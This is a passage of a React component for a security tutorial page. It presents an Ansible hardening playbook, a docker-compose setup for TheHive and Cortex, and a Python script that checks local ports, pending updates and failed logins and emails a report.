              Using penetration testing tools without proper authorization is illegal in most jurisdictions and can
              result in severe legal consequences. Always obtain explicit written permission before testing any systems.
            </AlertDescription>
          </Alert>
        </TabsContent>

        {/* Security Automation Tools */}
        <TabsContent value="automation" className="space-y-6">
          <h2 className="text-3xl font-bold mb-4">Security Automation Tools</h2>
          <p className="mb-4">
            Security automation tools help streamline and scale security processes, reducing manual effort and improving
            consistency in security operations.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">Ansible</h3>
              <p className="mb-3">
                Automation platform that can be used to implement security controls and ensure consistent configurations
                across systems.
              </p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Agentless architecture</li>
                <li>YAML-based playbooks</li>
                <li>Extensive module library</li>
                <li>Idempotent operations</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Automating security hardening, compliance checks, and remediation across infrastructure.</p>
            </div>

            <div className="border rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-bold mb-3">TheHive & Cortex</h3>
              <p className="mb-3">Open-source security incident response platform with automation capabilities.</p>
              <h4 className="font-semibold mb-2">Key Features:</h4>
              <ul className="list-disc pl-5 mb-3">
                <li>Case management</li>
                <li>Observable analysis</li>
                <li>Integration with security tools</li>
                <li>Automated response actions</li>
              </ul>
              <h4 className="font-semibold mb-2">Use Case:</h4>
              <p>Streamlining and automating security incident response workflows.</p>
            </div>
          </div>

          <h3 className="text-2xl font-bold mb-4">Automating Security Hardening with Ansible</h3>
          <CodeBlock
            language="yaml"
            code={`# security_hardening.yml - Ansible playbook for basic security hardening
---
- name: Security Hardening
  hosts: all
  become: yes
  tasks:
    - name: Update all packages
      apt:
        update_cache: yes
        upgrade: dist
      when: ansible_os_family == "Debian"

    - name: Install security packages
      apt:
        name:
          - fail2ban
          - ufw
          - auditd
          - rkhunter
        state: present
      when: ansible_os_family == "Debian"

    - name: Configure SSH - Disable root login
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^#?PermitRootLogin'
        line: 'PermitRootLogin no'
        state: present
      notify: Restart SSH

    - name: Configure SSH - Use strong ciphers
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^#?Ciphers'
        line: 'Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr'
        state: present
      notify: Restart SSH

    - name: Set up UFW - Allow SSH
      ufw:
        rule: allow
        name: OpenSSH
        state: enabled

    - name: Set up UFW - Enable firewall
      ufw:
        state: enabled
        policy: deny

    - name: Configure fail2ban
      copy:
        dest: /etc/fail2ban/jail.local
        content: |
          [sshd]
          enabled = true
          bantime = 3600
          findtime = 600
          maxretry = 5
      notify: Restart fail2ban

  handlers:
    - name: Restart SSH
      service:
        name: ssh
        state: restarted

    - name: Restart fail2ban
      service:
        name: fail2ban
        state: restarted`}
          />

          <h3 className="text-2xl font-bold mb-4">Setting Up TheHive for Incident Response Automation</h3>
          <CodeBlock
            language="yaml"
            code={`# docker-compose.yml for TheHive and Cortex
version: '3'
services:
  elasticsearch:
    image: 'elasticsearch:7.11.1'
    environment:
      - http.host=0.0.0.0
      - discovery.type=single-node
      - script.allowed_types=inline
      - thread_pool.search.queue_size=100000
      - thread_pool.write.queue_size=10000
    ulimits:
      nofile:
        soft: 65536
        hard: 65536
    volumes:
      - elasticsearch_data:/usr/share/elasticsearch/data
    
  cortex:
    image: 'thehiveproject/cortex:3.1.1'
    depends_on:
      - elasticsearch
    ports:
      - '9001:9001'
    volumes:
      - cortex_data:/opt/cortex/data
    
  thehive:
    image: 'thehiveproject/thehive4:4.1.0'
    depends_on:
      - elasticsearch
      - cortex
    ports:
      - '9000:9000'
    environment:
      - CORTEX_URL=http://cortex:9001
    volumes:
      - thehive_data:/opt/thp/thehive/data
      
volumes:
  elasticsearch_data:
  cortex_data:
  thehive_data:`}
          />

          <h3 className="text-2xl font-bold mb-4">Creating a Simple Security Automation Script with Python</h3>
          <CodeBlock
            language="python"
            code={`#!/usr/bin/env python3
# security_scanner.py - Simple security scanner and reporter

import subprocess
import socket
import json
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

def check_open_ports(host, ports):
    """Scan for open ports on the target host."""
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

def check_updates():
    """Check for available security updates."""
    try:
        output = subprocess.check_output(["apt", "-s", "upgrade"], universal_newlines=True)
        security_updates = []
        for line in output.split('\\n'):
            if "security" in line and "Inst" in line:
                security_updates.append(line.split()[1])
        return security_updates
    except:
        return ["Error checking for updates"]

def check_failed_logins():
    """Check for failed login attempts."""
    try:
        output = subprocess.check_output(["grep", "Failed password", "/var/log/auth.log"], universal_newlines=True)
        failed_attempts = {}
        for line in output.split('\\n'):
            if "Failed password" in line and "from" in line:
                parts = line.split()
                ip = parts[parts.index("from") + 1]
                if ip in failed_attempts:
                    failed_attempts[ip] += 1
                else:
                    failed_attempts[ip] = 1
        return failed_attempts
    except:
        return {"Error": "Could not check failed logins"}

def send_report(report_data, email_to):
    """Send security report via email."""
    msg = MIMEMultipart()
    msg['Subject'] = f"Security Scan Report - {datetime.now().strftime('%Y-%m-%d')}"
    msg['From'] = "security@example.com"
    msg['To'] = email_to
    
    body = f"""
    <h2>Security Scan Report</h2>
    <p>Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    
    <h3>Open Ports</h3>
    <ul>
    {"".join([f"<li>Port {port}</li>" for port in report_data['open_ports']])}
    </ul>
    
    <h3>Security Updates Available</h3>
    <ul>
    {"".join([f"<li>{update}</li>" for update in report_data['security_updates']])}
    </ul>
    
    <h3>Failed Login Attempts</h3>
    <table border="1">
    <tr><th>IP Address</th><th>Count</th></tr>
    {"".join([f"<tr><td>{ip}</td><td>{count}</td></tr>" for ip, count in report_data['failed_logins'].items()])}
    </table>
    """
    
    msg.attach(MIMEText(body, 'html'))
    
    try:
        server = smtplib.SMTP('smtp.example.com', 587)
        server.starttls()
        server.login("security@example.com", "password")
        server.send_message(msg)
        server.quit()
        return True
    except:
        return False

def main():
    # Configuration
    host = "localhost"
    ports_to_check = [22, 80, 443, 3306, 5432]
    email_recipient = "admin@example.com"
    
    # Run checks
    report = {
        'open_ports': check_open_ports(host, ports_to_check),
        'security_updates': check_updates(),
        'failed_logins': check_failed_logins()
    }
    
    # Save report to file
    with open(f"security_report_{datetime.now().strftime('%Y%m%d')}.json", 'w') as f:
        json.dump(report, f, indent=2)
    
    # Send email report
    send_report(report, email_recipient)
    
if __name__ == "__main__":
    main()`}
          />

          <h3 className="text-2xl font-bold mb-4">Security Automation Best Practices</h3>
          <ul className="list-disc pl-5 mb-6 space-y-2">
            <li>
              <strong>Start Small:</strong> Begin with simple, low-risk automation tasks and gradually expand.
            </li>
            <li>
              <strong>Test Thoroughly:</strong> Test automation in non-production environments before deployment.
            </li>
            <li>
              <strong>Include Error Handling:</strong> Build robust error handling and logging into automation scripts.
            </li>
            <li>
              <strong>Document Everything:</strong> Maintain comprehensive documentation of all automated processes.
            </li>
            <li>
              <strong>Human Oversight:</strong> Keep humans in the loop for critical security decisions.
            </li>
            <li>
              <strong>Regular Reviews:</strong> Periodically review and update automation to address changing threats.
            </li>
          </ul>

          <Alert>
            <AlertTriangle className="h-4 w-4" />
            <AlertTitle>Automation Risks</AlertTitle>
            <AlertDescription>
              Security automation can amplify mistakes if not properly implemented. Always include safeguards, testing
              procedures, and human oversight in your automation workflows.
            </AlertDescription>
          </Alert>
        </TabsContent>
      </Tabs>
    </div>
  )
}
